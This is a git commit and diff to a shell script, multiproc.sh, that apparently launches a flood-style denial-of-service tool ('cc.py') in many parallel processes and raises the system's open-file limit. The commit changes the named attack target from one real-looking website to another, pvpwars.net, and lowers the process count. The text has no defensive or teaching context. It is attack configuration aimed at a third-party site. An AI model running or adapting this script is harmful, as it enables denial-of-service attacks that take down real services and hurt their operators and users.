a3f324b1589f14773b6835e2803b1b6f61329cbb
99999999999999urmom <120137936+99999999999999urmom@users.noreply.github.com>
2022-12-09 20:02:35 +0100

    Update multiproc.sh

--- multiproc.sh
+++ multiproc.sh
@@ -6,10 +6,10 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url https://bbos.cat -v 5 -s 999"
+atk_cmd="python3 cc.py -url https://pvpwars.net -v 5 -s 999"
 
 #number of process that you want
-process=999
+process=99
 
 #change the system limit
 ulimit -n 9999999
